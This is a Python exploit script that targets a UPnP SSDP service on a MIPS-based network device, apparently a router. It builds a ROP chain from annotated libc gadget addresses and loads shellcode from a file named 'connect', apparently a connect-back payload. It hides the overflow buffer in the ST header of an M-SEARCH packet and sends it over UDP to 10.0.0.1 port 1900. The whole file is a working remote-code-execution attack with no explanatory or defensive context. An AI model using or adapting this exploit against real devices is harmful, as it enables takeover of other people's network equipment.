import socket
import random
import socket
import hexdump

# 2ae50000
#-2aef0000 /lib/libc.so.0

#BSIZE = 0x1b4
BSIZE = 0x1b0

rdstr = bytearray('\x41' * BSIZE, 'UTF-8')

# return address overwrite
rdstr[0xcc:0xd0] = b'\x2a\xeb\x03\x30' # 0x60330 
#MEMORY:2AD4B330 li      $a0, 1
#MEMORY:2AD4B334 ori     $a1, $s1, 2
#MEMORY:2AD4B338 move    $t9, $s0
#MEMORY:2AD4B33C jalr    $t9

#s0 
rdstr[0xb8:0xbc] = b'\x2a\xe7\x13\x80' # 0x21380 
#MEMORY:2AD0C380 move    $t9, $s2
#MEMORY:2AD0C384 jalr    $t9
#MEMORY:2AD0C388 nop
#MEMORY:2AD0C38C lw      $gp, 0x10($sp)
#MEMORY:2AD0C390 lw      $ra, 0x24($sp) <------ stack variable  defined bellow  b'\x2a\xd2\x4b\x34' 
#MEMORY:2AD0C394 lw      $s2, 0x20($sp)
#MEMORY:2AD0C398 lw      $s1, 0x1C($sp) 
#MEMORY:2AD0C39C lw      $s0, 0x18($sp) <------- stack variable defined bellow b'\x2a\xd3\x41\x8c'
#MEMORY:2AD0C3A0 jr      $ra
#MEMORY:2AD0C3A4 addiu   $sp, 0x28


#s4
rdstr[0xc8:0xcc]  = b'\x2a\xea\xe9\x30' # 0x5e930 

#s2 ( sleep function ) 
rdstr[0xc0:0xc4] = b'\x2a\xea\xe9\x30' # 0x5e930 

rdstr[0xf4:0xf8] = b'\x2a\xe8\x9b\x34' # 0x39b34 
#MEMORY:2AD24B34 addiu   $a0, $sp, 0x18  <----- puts pos in buffer in a0 
#MEMORY:2AD24B38 move    $a1, $s1
#MEMORY:2AD24B3C move    $t9, $s0
#MEMORY:2AD24B40 jalr    $t9
#MEMORY:2AD24B44 nop

#s1
rdstr[0xec:0xf0] = b'\xFF\xFF\xFF\xFD'

#s2
rdstr[0xf0:0xf4] = b'\xFF\xFF\xFF\xFE'

rdstr[0xe8:0xec] = b'\x2a\xe9\x91\x8c' # 0x4918c 
#MEMORY:2AD3418C move    $t9, $a0
#MEMORY:2AD34190 sw      $v0, 0x18($sp)
#MEMORY:2AD34194 jalr    $t9
#MEMORY:2AD34198 addiu   $a0, $sp, 0x18


#landing point in buffer 0x114 

#rdstr[0x114:0x118] = b'\x66\x66\x66\x66' # <--- proof of landing

o = open('connect','rb')
data = o.read()
o.close()

print(len(data))

for x in range(0,len(data)):
    rdstr[0x110+x] = data[x]

#rdstr[0x114:len(data)] = data

#hexdump.hexdump(data)
#print '---------------------------------------------------------------------'
hexdump.hexdump(rdstr) 


#device_ip = "239.255.255.250"
device_ip = "10.0.0.1"
upnp_port = 1900
template =  "M-SEARCH * HTTP/1.1\r\n"\
           "Host:239.255.255.250:1900\r\n"\
           "ST:\"uuid:schemas:device:{}:end\"\r\n"\
           "Man:\"ssdp:discover\"\r\n"\
           "MX:2\r\n\r\n"

final_message = template.format(rdstr)

print("UDP target IP:", device_ip)
print("UDP target port:", upnp_port)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP

sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
sock.sendto(bytes(final_message, 'UTF-8'), (device_ip, upnp_port))

